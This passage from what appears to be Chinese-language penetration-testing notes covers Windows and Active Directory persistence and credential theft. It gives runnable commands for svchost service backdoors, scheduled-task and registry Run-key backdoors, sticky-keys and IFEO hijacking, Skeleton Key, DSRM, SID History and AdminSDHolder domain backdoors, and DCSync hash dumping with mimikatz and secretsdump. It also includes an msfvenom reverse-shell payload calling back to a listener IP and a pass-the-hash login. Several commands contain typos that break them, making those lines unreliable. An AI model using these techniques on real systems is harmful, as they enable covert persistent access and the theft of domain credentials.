<h6 id="2-利用现有服务"><a href="#2-利用现有服务" class="headerlink" title="2.利用现有服务"></a>2.利用现有服务</h6><p>利用现有服务路径修改即可，将路径映射至木马文件路径就可以实现木马持续被启动，达到权限维持的目的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用sc config修改binpath二进制选项</span><br><span class="line">也可以修改注册表ImagePath键</span><br></pre></td></tr></table></figure></div>

<h6 id="3-利用svchost-exe启动服务"><a href="#3-利用svchost-exe启动服务" class="headerlink" title="3.利用svchost.exe启动服务"></a>3.利用svchost.exe启动服务</h6><p>简要来说就是Windows中有些进程的启动得依托它才行</p>
<p>以DLL形式实现，所以可以将可执行文件路径指向svchost.exe，有它调用DLL文件，具体哪个就得是这个服务在注册表的信息决定的了</p>
<p>举个栗子</p>
<p>以wuauserv服务为例</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093442598.png"
                      alt="image-20230322093442598"
                ></p>
<p>这个服务的启动路径是由svchost.exe加载DLL实现的</p>
<p>这之中还有个parameters子项ServiceDLL是表明由哪个DLL文件负责的，就是说这个服务运行时会加载wuaueng.dll文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093846338.png"
                      alt="image-20230322093846338"
                ></p>
<p>注意每个svchost.exe负责一组进程的运行</p>
<p>svchost.exe的所有服务分组于注册表的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103733030.png"
                      alt="image-20230322103733030"
                ></p>
<p>中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103923408.png"
                      alt="image-20230322103923408"
                ></p>
<p>攻击的原理就是加载恶意服务到svchost.exe中建立持久化后门，又不是单独运行的，所以隐蔽性特别高</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击步骤</span><br><span class="line">1制作一个后门dll文件</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.81.135 lport=6000 -f dll -o gongji.dll   </span><br><span class="line"></span><br><span class="line">2.上传至目标主机System32目录执行以下命令</span><br><span class="line">先创建一个名为backdoor的服务，然后以svchost加载方式启动，服务分组为netsvc</span><br><span class="line">sc create backdoor binPath= &quot;C:\Windows\Ststem32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem</span><br><span class="line">然后再将这个服务启动时的加载路径设为后门木马的路径</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\reverse_tcp.dll&quot;</span><br><span class="line">配置服务描述</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v Destription /t REG_sz /d &quot;Windows xxx Service&quot;</span><br><span class="line">配置服务显示名称</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v DisplayName /t REG_sz /d &quot;Backdoor&quot;</span><br><span class="line">创建服务新分组netsvc，并将backdoor服务添加进去</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrrntVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d backdoor</span><br></pre></td></tr></table></figure></div>

<p>然后只要系统重启就可以导致木马被重新启动</p>
<h3 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h3><p>就是让目标主机再指定的周期内自动重复的运行事先准备好的后门</p>
<p>使用schtasks命令来实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</span><br><span class="line">表示在主机上创建一个名为Backdoor的任务，并在每天的8点以SYSTEM权限运行</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322170426739.png"
                      alt="image-20230322170426739"
                ></p>
<p>以下命令是创建一个名为Backdoor的计划任务，每60秒运行一次</p>
<p><code>schtasks /Create /TN  Backdoor /SC minute /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</code></p>
<p>有一点要说明计划任务是在计划任务库中的类似文件目录的形式存储，所有的计划任务都在最内层，为了增加隐蔽性，所以要遵守规范</p>
<p>执行以下命令，表示在路径下创建一个AppRun的后门</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172521990.png"
                      alt="image-20230322172521990"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172505028.png"
                      alt="image-20230322172505028" style="zoom: 33%;" 
                >



<h3 id="启动项-x2F-注册表键后门"><a href="#启动项-x2F-注册表键后门" class="headerlink" title="启动项&#x2F;注册表键后门"></a>启动项&#x2F;注册表键后门</h3><h6 id="1-系统启动文件夹"><a href="#1-系统启动文件夹" class="headerlink" title="1.系统启动文件夹"></a>1.系统启动文件夹</h6><p>将程序放在启动文件夹中会导致该程序在用户登入时启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定用户登入时启动</span><br><span class="line">C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start</span><br><span class="line">C:\C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">所有用户登入时启动</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure></div>

<p>木马放进去就行</p>
<h6 id="2-运行键（Run-Key）"><a href="#2-运行键（Run-Key）" class="headerlink" title="2.运行键（Run Key）"></a>2.运行键（Run Key）</h6><p>windows中有许多注册表项可以用来设置在系统启动或者用户登陆时运行指定的程序或加载指定DLL文件</p>
<p>当登陆时，系统就会依次运行位于注册表运行键中的程序</p>
<p>默认创建以下运行键，如果要修改HKEY_LOCAL_MACHINE下的运行键，需要拥有管理员级别的权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将在当前用户登陆时启动</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">将在所有用户登陆时启动</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure></div>

<p>执行的命令，表示在注册表运行键中添加一个叫backdoor的键，并且指向后门文件的绝对路径</p>
<p><code>reg add &quot;HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v backdoor /t REG_SZ /D &quot;C:\Windows\System32\reverse_TCP.exe&quot;</code></p>
<h6 id="3-Winlogon-Helper"><a href="#3-Winlogon-Helper" class="headerlink" title="3.Winlogon Helper"></a>3.Winlogon Helper</h6><p>这个是一个Windows系统组件，处理一系列与用户有关的行为，这些行为在注册表中，并且定义了在Windows登录期间会启动那些进程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定用户登录时执行的和用户初始化程序，默认是userinit.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line">指定windows身份验证期间执行的程序，默认为explorer.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br></pre></td></tr></table></figure></div>

<p>执行命令</p>
<p><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\reverse_tcp.exe&quot; /f</code></p>
<p>注意：在利用这两个键时需要保留原有的程序，可以将后门添加到原有程序后面以“，”分隔就行，并且需要上传到C:\Windows\System32文件夹中</p>
<h3 id="Port-Monitors"><a href="#Port-Monitors" class="headerlink" title="Port Monitors"></a>Port Monitors</h3><p>打印机后台处理服务负责管理Windows系统的打印作业</p>
<p>主要是依靠他之中的AddMonitor函数将DLL注入spoolsv.exe进程</p>
<p>1.通过msf生成一个64位的DLL恶意木马</p>
<p>2.将这个文件上传到目标主机的C:\Windows\System32目录中</p>
<p>执行<code>reg add &quot;HKLM\SYSTEM CurrentControlSet\Control\Print\Monitors\TestMonitor&quot; /v &quot;Driver&quot; /t REG_SZ /d &quot;reverse_tcp.dll&quot;</code></p>
<p>当系统启动的时候，print spooler服务在启动过程会读取Monitors注册表项的所有子键，并且以SYSTEM权限加载Driver键值所指定的DLL文件</p>
<h2 id="事件触发执行"><a href="#事件触发执行" class="headerlink" title="事件触发执行"></a>事件触发执行</h2><h4 id="利用WMI订阅事件"><a href="#利用WMI订阅事件" class="headerlink" title="利用WMI订阅事件"></a>利用WMI订阅事件</h4><h6 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><h6 id="2-相关辅助工具"><a href="#2-相关辅助工具" class="headerlink" title="2.相关辅助工具"></a>2.相关辅助工具</h6><p>利用Sharp-WMIEvent工具，可以实现持久化功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\Windows\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>这表示在主机上部署一个永久性的订阅事件，每当用户登录时就会调用，远程主机就会上线</p>
<p>此外msf还包含一个内置框架也可以通过WMI实现持久性的模块，exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence，支持的选项不同，可以用于在特定的事件触发时在系统上执行任意攻击载荷</p>
<h4 id="利用系统辅助功能"><a href="#利用系统辅助功能" class="headerlink" title="利用系统辅助功能"></a>利用系统辅助功能</h4><p>一般Windows系统会有许多组合快捷键来达到某种功能如Windows+“+”、Windows+U等</p>
<p>最常用的时连按五次shift打开粘滞键sethc.exe程序</p>
<p>通常将cmd.exe伪装成sethc.exe，此方法需要管理员权限</p>
<h6 id="1-手动利用-1"><a href="#1-手动利用-1" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><p>在高版本Windows中，C:\Windows\System32目录下的文件收到系统的保护，只有TrustedInstaller权限用户才对其中的问价拥有修改和写入权限，所以在这之前需要通过令牌窃取提升至TrustedInstaller权限。</p>
<p>获取后执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd C:\\Windows\System32</span><br><span class="line">move sethc.exe sethc.exe.bak      将文件sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe            将一个cmd.exe副本伪装成sethc.exe</span><br></pre></td></tr></table></figure></div>

<p>这时候连按五次shift键就可以开启cmd.exe，权限为SYSTEM</p>
<h6 id="2-RDP劫持"><a href="#2-RDP劫持" class="headerlink" title="2.RDP劫持"></a>2.RDP劫持</h6><h4 id="IFEO注入"><a href="#IFEO注入" class="headerlink" title="IFEO注入"></a>IFEO注入</h4><p>IFEO是Windows系统的一个注册表项，位于HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options中，负责为一些在默认系统环境中运行时可能引发错误的程序执行提供一个特殊的环境设定</p>
<h6 id="1-Dubugger"><a href="#1-Dubugger" class="headerlink" title="1.Dubugger"></a>1.Dubugger</h6><p>当用户启动计算机后，系统就会在注册表中的IEFO中查询所有的程序的子键，如果存在与该程序名相同的子键就会读取相应的Dubugger键值，如果键值没被设置就不做处理，否则则将键值所对应的路径作为程序的启动路径来代替原始程序</p>
<p>可以联想到上面的粘滞键，测试人员就可以修改粘滞键注册表信息来创建后门，就不需要TrustedInstaller权限</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>向Image File Execution Options注册表项中添加映像劫持子键，并将“Dubugger”的值设置为要执行的程序即可</p>
<p>然后连按5次就可以成功弹出命令</p>
<h6 id="2-GlobalFlag"><a href="#2-GlobalFlag" class="headerlink" title="2.GlobalFlag"></a>2.GlobalFlag</h6><p>IFEO还可以指定程序静默退出时启动任意监控程序</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">启用对记事本进程的静默推出监视</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line">启用Windows错误报告进程WarFault.exe，它将成为reverse_tcp.exe的父进程</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line">将监视器设为reverse_tcp.exe</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Winodws\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>这样用户打开记事本之后正常运行，但是关闭记事本时将在WerFault.exe进程中创建子进程以运行后门程序reverse_tcp.exe</p>
<h4 id="利用屏幕保护程序"><a href="#利用屏幕保护程序" class="headerlink" title="利用屏幕保护程序"></a>利用屏幕保护程序</h4><p>屏幕保护时Windows的一种功能，保护程序具有.scr扩展文件名组成的可执行文件</p>
<p>位于HKEY_CURRENT_USER\Control Panel\Desktop</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324084138795.png"
                      alt="image-20230324084138795"
                ></p>
<p>我们就可以通过编辑注册表，修改scrnsave.exe的键的值，即修改路径</p>
<p>实现触发屏幕保护程序，实现后门触发</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将触发屏幕保护程序时执行的程序自定义为恶意程序，这里可以以.scr或.exe结尾的都可以</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Users\Marcus reverse_tcp.scr&quot;</span><br><span class="line">启用屏幕保护</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1</span><br><span class="line">设置不需要密码</span><br><span class="line">reg add &quot;HKEY_CURRENT_USERControl Panel\Desktop&quot; /v ScreenSaverIsSecure /t REG_SZ /d &quot;0&quot;</span><br><span class="line">将用户不活动的超时设为60秒</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER Control Panel、Desktop&quot; /v ScreenSaveTime0ut /t REG_SZ /d &quot;60&quot;</span><br></pre></td></tr></table></figure></div>

<p>这个不需要管理员权限，普通用户即可</p>
<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>DLL劫持的原理是将同名的恶意DLL文件放在合法的DLL文件所在路径的搜索位置中，当应用程序搜索DLL时，就会用恶意DLL代替合法的DLL来加载。需要管理员权限</p>
<h6 id="1-劫持应用程序"><a href="#1-劫持应用程序" class="headerlink" title="1.劫持应用程序"></a>1.劫持应用程序</h6><h2 id="常见的域后门技术"><a href="#常见的域后门技术" class="headerlink" title="常见的域后门技术"></a>常见的域后门技术</h2><h3 id="创建Skeleton-Key域后门"><a href="#创建Skeleton-Key域后门" class="headerlink" title="创建Skeleton Key域后门"></a>创建Skeleton Key域后门</h3><p>Skeleton Key即万能钥匙，在域控安装这个东西所有的账户都可以用同一个密码，同时原有密码依然有效，但是重启域控之后就失效了</p>
<h6 id="1-常规利用"><a href="#1-常规利用" class="headerlink" title="1.常规利用"></a>1.常规利用</h6><p>通过mimikatz执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>就可以创建一个Skeleton Key域后门密码为mimikatz</p>
<h6 id="2-缓解措施"><a href="#2-缓解措施" class="headerlink" title="2.缓解措施"></a>2.缓解措施</h6><p>微软对于这个问题在2014年3月添加了一个LSA保护策略，可以执行命令开启关闭LSA</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\lSA&quot; /V RunAsPPL /T REG_DWORD /d 1 /f</span><br><span class="line">关闭</span><br><span class="line">reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL</span><br></pre></td></tr></table></figure></div>

<p>开启后，mimikatz就会失效，都无法安装SkeletonKey</p>
<p>但是！！</p>
<p>早在2013年10月mimikatz就支持绕过LSA保护。该功能需要mimikatz中的mimidrv.sys文件，命令为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">           !+</span><br><span class="line">           !processprotect /process:lsass.exe /remove</span><br><span class="line">           misc::sekleton</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324220115568.png"
                      alt="image-20230324220115568"
                ></p>
<h3 id="创建DSRM域后门"><a href="#创建DSRM域后门" class="headerlink" title="创建DSRM域后门"></a>创建DSRM域后门</h3><p>DSRM时域中的一中安全模式，用于使服务器脱机，进行紧急维护使用，可以后期来修复、还原或重建活动目录数据库</p>
<p>DSRM修改密码指令（NTDSUtil）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入NTDSUtil</span><br><span class="line">ntdsutil</span><br><span class="line">进入设置DSRM账户密码设置模式</span><br><span class="line">set dsrm password</span><br><span class="line">在当前的域控制器上恢复DSRM密码</span><br><span class="line">reset passwrod on server null</span><br><span class="line">输入新密码</span><br><span class="line">再次输入密码</span><br><span class="line">退出</span><br><span class="line">q</span><br><span class="line">退出ntdsutil</span><br><span class="line">q</span><br></pre></td></tr></table></figure></div>

<p>注意：仅支持win server 2008以上且需要管理员权限</p>
<p>1.执行</p>
<p><code>mimikatz.exe &quot;privilege::Debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</code></p>
<p>读取SAM中的DSRM账户的哈希值</p>
<p>2.更改登录模式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">有以下三种模式</span><br><span class="line">0：只有在域控重启并进入DSRM模式时，才可以使用DSRM管理员账号</span><br><span class="line">1：只有在本地AD、DS停止服务的时候才可以使用DARM账号</span><br><span class="line">2：任何情况下都可以使用DSRM账号</span><br></pre></td></tr></table></figure></div>

<p>执行</p>
<p><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f</code></p>
<p>将模式改为2，允许任何情况下都可以使用DSRM账户</p>
<p>3.kali执行 python3 psexec.py DC-1&#x2F;<a class="link"   href="mailto:&#65;&#100;&#109;&#105;&#x6e;&#x69;&#115;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#x40;&#x31;&#48;&#46;&#49;&#x30;&#46;&#49;&#48;&#46;&#x31;&#49;" >&#65;&#100;&#109;&#105;&#x6e;&#x69;&#115;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#x40;&#x31;&#48;&#46;&#49;&#x30;&#46;&#49;&#48;&#46;&#x31;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -hashes:cb136a448767792bae25563a498a86e6</p>
<p>即可连接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325140257148.png"
                      alt="image-20230325140257148"
                ></p>
<h3 id="SID-History的利用"><a href="#SID-History的利用" class="headerlink" title="SID History的利用"></a>SID History的利用</h3><p>在Windows中，SID是指安全标识符，是用户、用户组或其他安全主题的唯一、不可变的标识符</p>
<p>Windows根据ACL也就是访问控制列表授予或拒绝对资源的访问和特权，ACL使用SID来识别用户身份</p>
<p>如果一个账户被删除，重新建立一个相同名字的账户，其权限不会是前一个账户的权限，因为SID是不一样的</p>
<p>SID History是一个支持域迁移方案的属性，使得账户的访问权限能有效克隆，原理就是克隆SID</p>
<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以将域管理员的SID添加到其他域用户的SID History属性中，以此建立一个隐藏的域后门，需要域管理员权限</p>
<p>1.创建一个nihao用户进行演示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325144331155.png"
                      alt="image-20230325144331155"
                ></p>
<p>2.上传mimikatz执行命令，并且将域管理员的SID添加到Hacker的SID History属性中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz&gt;2.1.0</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam:nihao /new:Administrator&quot; exit</span><br><span class="line">&lt;2.1.0</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc:addsid Hacker ADSAdministrator&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>3.通过powerhell查看nihao用户的属性</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser nihao -Properties SIDHistory</span><br></pre></td></tr></table></figure></div>

<p>发现SID History属性值已经和域管理员账户的SID相同，说明已经继承了域管理员的权限</p>
<p>4.通过nihao用户连接</p>
<p>kali      python3 wmiexec.py HACK-MY&#x2F;nihao:nihao\Admin!@#<a class="link"   href="mailto:&#x34;&#53;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x38;&#x31;&#x2e;&#x31;&#52;&#48;" >&#x34;&#53;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x38;&#x31;&#x2e;&#x31;&#52;&#48; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="利用AdminSDHolder打造域后门"><a href="#利用AdminSDHolder打造域后门" class="headerlink" title="利用AdminSDHolder打造域后门"></a>利用AdminSDHolder打造域后门</h3><p>AdminSDHolder是一个特殊的AD容器对象，位于Domain NC的system容器下</p>
<p>一般作为某些受保护对象的安全模板，防止这些对象遭受恶意的修改或者滥用</p>
<p>受保护对象通常包括特权用户和受保护的组，Administrator、Domain Admins、Enterprise Admin以及Schema Admins等</p>
<p>在活动目录中用adminCount用来标记特权用户和组，通常特权用户和组属性被设为1</p>
<p>通过AdFind查询adminCount属性设置为1的对象，可以找到所有受AdminSDHolder保护的特权和组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">列举受保护的用户</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot; -dn</span><br><span class="line">列举搜保护的组</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn</span><br></pre></td></tr></table></figure></div>

<p>默认下，系统会定期检查（60分钟）受保护对象的安全描述符，将受保护对的ACL和AdminSDHolder的ACL相比较，如果不一致将会强制修改为AdminSDHolder的ACL（通过SDProp进程来完成检查）</p>
<h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以篡改AdminADHolder的ACL配置，然后60分钟后SDPorp调用将会强制改变受保护对象的ACL，以此建立一个隐蔽的后门，需要域管理员权限</p>
<p>执行命令，通过powerView向AdminSDHolder容器添加一个ACL，使普通的域用户拥有对AdminSDHolder的完全控制权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>

<p>等60分钟让SDProp生效，也可以用指令使其时间缩短，这个时候Marcus用户就可以向Domain Admins等关键用户组成员添加成员</p>
<p>清除这个权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>

<h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p>PasswordChangeNotify这个东西是windows中为了重置密码，windows会检查新密码的复杂性是否够安全，如果符合要求LSA就会调用它在系统中同步密码</p>
<p>调用的过程中密码是明文传输，所以可以利用KOOK技术在调用过程中劫持密码</p>
<h2 id="DCSync技术"><a href="#DCSync技术" class="headerlink" title="DCSync技术"></a>DCSync技术</h2><h3 id="利用DCSync导出域内hash"><a href="#利用DCSync导出域内hash" class="headerlink" title="利用DCSync导出域内hash"></a>利用DCSync导出域内hash</h3><p>在一个域环境中可以有多台域控，每台域控各自存储着一份所在域的活动目录的可写副本</p>
<p>对目录的任何修改都可以从源域控中同步到其他域控中</p>
<p>当一个域控想从其他域控获取数据时，客户端域控会向服务端域控获取DSGetNCChanges请求，这个请求的响应包含着更新</p>
<p>一般15分钟会有一次域同步</p>
<p>DCSync就是利用域控同步原理，通过Directory Replication Service服务的IDL——DRSGetNCChanges接口向域控发起请求</p>
<p>可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控的数据</p>
<p>注意：此攻击并不适用于只读域控（RODC）</p>
<h4 id="mimikatz下的利用"><a href="#mimikatz下的利用" class="headerlink" title="mimikatz下的利用"></a>mimikatz下的利用</h4><p>mimikatz在2015年8月更新中添加了DCSync功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">导出域内指定用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hack-my\administrator&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325162902673.png"
                      alt="image-20230325162902673"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">导出域内所有用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163104824.png"
                      alt="image-20230325163104824"
                ></p>
<p><code>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163210977.png"
                      alt="image-20230325163210977"
                ></p>
<h4 id="Impacket下的利用"><a href="#Impacket下的利用" class="headerlink" title="Impacket下的利用"></a>Impacket下的利用</h4><p>Impacket中的secretsdump.py可以支持DCSync技术导出域控中的用户哈希</p>
<p>该工具可以使用高权限用户的密码来实现从域外主机读取域内主机的hash值，同时可以通过Dcsync或卷影复制的方法，NTDS.dit的中导出所有用户的hash值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py hack-my.com/administrator(账号):Admin!@#45(密码)@192.168.81.140(域控IP) -just-dc-user &quot;hack-my\administrator&quot;</span><br></pre></td></tr></table></figure></div>

